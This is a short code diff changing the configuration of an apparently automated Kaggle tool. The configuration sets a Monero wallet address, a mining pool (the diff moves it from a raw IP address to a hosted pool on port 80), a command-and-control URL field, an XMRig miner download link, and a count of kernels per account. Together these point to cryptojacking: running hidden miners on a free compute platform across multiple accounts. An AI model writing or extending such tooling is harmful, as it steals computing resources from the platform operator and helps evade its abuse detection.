@@ -27,7 +27,7 @@ log = get_logger('kaggle_auto')
 # ============================================================================
 CONFIG = {
     "wallet": os.environ.get("WALLET", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"),
-    "pool": os.environ.get("POOL", "45.155.102.89:10128"),
+    "pool": os.environ.get("POOL", "pool.hashvault.pro:80"),
     "c2_url": os.environ.get("C2_URL", ""),
     "xmrig_url": "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz",
     "kernels_per_account": 5,
